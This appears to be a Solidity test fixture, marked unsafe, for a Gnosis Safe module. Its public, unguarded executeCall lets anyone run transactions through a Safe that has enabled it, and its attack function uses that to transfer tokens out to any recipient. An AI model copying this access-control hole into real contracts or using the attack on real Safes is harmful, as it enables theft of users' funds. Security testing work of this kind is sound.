pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

import "hardhat/console.sol";

/*
 * @notice UNSAFE CODE - DO NOT USE IN PRODUCTION
 */
contract ControllerModule {
    function executeCall(GnosisSafe manager, address to, uint256 value, bytes memory data) public {
        require(
            manager.execTransactionFromModule(to, value, data, Enum.Operation.Call)
        );
    }

    function attack(address manager_, address token_, address recipient_, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", recipient_, amount);
        executeCall(GnosisSafe(payable(manager_)), token_, 0, data);
    }
}